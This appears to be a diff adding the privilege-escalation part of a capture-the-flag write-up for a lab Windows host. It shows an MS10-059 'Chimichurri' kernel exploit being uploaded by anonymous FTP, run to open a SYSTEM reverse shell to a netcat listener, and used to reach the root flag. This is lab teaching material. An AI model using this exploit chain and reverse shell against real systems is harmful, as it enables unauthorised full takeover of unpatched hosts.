@@ -325,10 +325,70 @@ Powershell seems to get stuck, reverse shell over nc cannot handle it. One optio
 -winpeas.bat: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat
 -wesng (https://github.com/bitsadmin/wesng) is a Windows Exploit Suggester Next Generation, and it find 236 vulnerabilities.
 
-So much to choose from, but CVE-2010-2554 (MS10-059) has pre-compiled exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
+So much to choose from, let's go with CVE-2010-2554 (MS10-059).
+
+Change to a Windows 32-bit machine for compiling the exploit (https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri).
+
+
+FTP the executable to the target host
+
+```
+$ ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> bin
+200 Type set to I.
+ftp> put Chimichurri.exe
+local: Chimichurri.exe remote: Chimichurri.exe
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+862720 bytes sent in 3.23 secs (260.6575 kB/s)
+ftp> bye
+221 Goodbye.
 
 ```
 
+Start a listener and execute the exploit
+
+```
+c:\inetpub\wwwroot>Chimichurri.exe 10.10.14.16 4444
+Chimichurri.exe 10.10.14.16 4444
+/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
+c:\inetpub\wwwroot>
+
+
+$ nc -nvlp 4444                                          
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.5] 49159
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\inetpub\wwwroot>whoami
+whoami
+nt authority\system
+
+c:\inetpub\wwwroot>
 ```
 
+And finally locate the flag
+```
+c:\inetpub\wwwroot>dir c:\users\Administrator\Desktop
+dir c:\users\Administrator\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of c:\users\Administrator\Desktop
+
+14/01/2021  11:42 ��    <DIR>          .
+14/01/2021  11:42 ��    <DIR>          ..
+18/03/2017  01:17 ��                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  22.285.721.600 bytes free
+```
 
